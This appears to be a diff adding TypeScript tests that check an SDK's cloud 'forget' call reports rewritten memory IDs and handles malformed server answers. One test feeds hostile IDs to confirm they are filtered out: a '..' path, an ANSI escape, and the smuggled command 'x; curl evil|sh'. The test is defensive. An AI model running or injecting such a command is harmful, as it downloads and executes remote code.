@@ -95,3 +95,90 @@ describe('oort.forget({ everywhere }) in Oort Cloud (CON-67)', () => {
 });
 
 // Local mode refuses `everywhere` as cloud-only: contract/sdk/cases/ids.json covers it.
+
+describe('oort.forget in Oort Cloud reports what it rewrote (CON-161)', () => {
+  const LATER = '66666666-7777-4888-8999-aaaaaaaaaaaa';
+  const NEXT = '77777777-8888-4999-8aaa-bbbbbbbbbbbb';
+
+  it('sdk.cloud-forget-lists-rewritten-and-notRewritten-as-local-mode-does', async () => {
+    const { oort } = await cloud((c) => {
+      c.forgetAnswer = {
+        rewritten: [LATER],
+        notRewritten: [NEXT],
+        reasons: { [NEXT]: 'quota' },
+      };
+    });
+    expect(await oort.forget(ID)).toEqual({
+      forgotten: ID,
+      rewritten: [LATER],
+      notRewritten: [NEXT],
+    });
+    await oort.close();
+  });
+
+  it('sdk.cloud-forget-everywhere-lists-them-too', async () => {
+    const { oort } = await cloud((c) => {
+      copyIn(c, CORE);
+      c.forgetAnswer = { rewritten: [LATER], notRewritten: [NEXT], reasons: { [NEXT]: 'timeout' } };
+    });
+    expect(await oort.forget(ID, { everywhere: true })).toEqual({
+      forgotten: ID,
+      rewritten: [LATER],
+      notRewritten: [NEXT],
+      withdrawn: [CORE],
+      requested: [],
+      unreachable: [],
+    });
+    await oort.close();
+  });
+
+  it('sdk.cloud-forget-with-empty-lists-leaves-the-fields-out-as-local-mode-does', async () => {
+    const { oort } = await cloud();
+    expect(await oort.forget(ID)).toEqual({ forgotten: ID });
+    await oort.close();
+  });
+
+  it('sdk.cloud-forget-on-an-oort-cloud-from-before-rewrites-or-an-odd-answer-claims-nothing', async () => {
+    for (const answer of [
+      'pre-rewrite' as const,
+      { rewritten: 'yes', notRewritten: 7, reasons: null },
+      { rewritten: [LATER, 3], notRewritten: [LATER] },
+    ]) {
+      const { oort, c } = await cloud((c) => {
+        c.forgetAnswer = answer;
+      });
+      const r = await oort.forget(ID);
+      expect(r.forgotten).toBe(ID);
+      expect(r.rewritten).toBeUndefined();
+      expect(c.memories.has(ID)).toBe(false);
+      await oort.close();
+    }
+    const { oort } = await cloud((c) => {
+      copyIn(c, CORE);
+      c.forgetAnswer = 'pre-rewrite';
+    });
+    expect(await oort.forget(ID, { everywhere: true })).toEqual({
+      forgotten: ID,
+      withdrawn: [CORE],
+      requested: [],
+      unreachable: [],
+    });
+    await oort.close();
+  });
+
+  it('sdk.cloud-forget-never-returns-an-id-that-is-not-a-memory-id (CON-161)', async () => {
+    const { oort } = await cloud((c) => {
+      c.forgetAnswer = {
+        rewritten: ['..', LATER, 'x; curl evil|sh'],
+        notRewritten: ['\u001b[31m', NEXT, 7],
+      };
+    });
+    expect(await oort.forget(ID)).toEqual({
+      forgotten: ID,
+      rewritten: [LATER],
+      notRewritten: [NEXT],
+      notRewrittenUnnamed: 2,
+    });
+    await oort.close();
+  });
+});
